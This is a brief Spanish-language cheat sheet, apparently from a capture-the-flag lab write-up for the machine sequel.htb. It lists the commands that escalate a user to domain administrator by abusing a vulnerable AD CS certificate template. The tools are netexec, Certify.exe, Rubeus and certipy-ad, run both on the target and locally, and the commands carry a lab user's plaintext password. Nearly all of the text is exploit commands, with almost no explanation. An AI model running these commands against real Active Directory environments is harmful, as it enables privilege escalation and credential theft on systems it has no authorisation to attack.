```bash
netexec ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
```

- Subimos certipy
```powershell
.\Certify.exe find /vulnerable /currentuser
```
- Explotar
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

- Ejecutamos lo que nos dice el output para el pfx y luego
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```


## Desde Local

```bash
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```
- Exploit
```bash
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication
```
- Autenticarse
```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
```
